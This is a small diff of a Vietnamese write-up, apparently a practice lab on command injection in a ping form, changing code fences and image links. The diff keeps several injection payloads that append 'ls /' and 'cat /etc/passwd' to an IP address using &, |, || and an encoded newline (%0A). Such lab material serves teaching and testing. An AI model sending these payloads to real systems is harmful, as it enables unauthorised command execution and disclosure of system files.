@@ -62,15 +62,14 @@ Tuy nhiên, vẫn còn nhiều ký tự khác giúp nối thêm mệnh đề:
 
 ### 🧪 Thực hành:
 
-```
+
 ![aaa](images/image6.png)
 8.8.8.8 & ls / & cat /etc/passwd
 
 8.8.8.8 | ls / | cat /etc/passwd
 8.8.8.8a || ls /
-![bbb](images/image7.png)
-```
 
+![](images/image7.png)
 ---
 
 ## 🔺 LEVEL: HIGH
@@ -119,7 +118,7 @@ ip=8.8.8.8%0Als+%2F
 ```
 8.8.8.8%0Acat /etc/passwd
 ```
-![](images/image6.png)
+![](images/image10.png)
 > ✅ Kết quả: **Giả thuyết đúng**
 
 ---
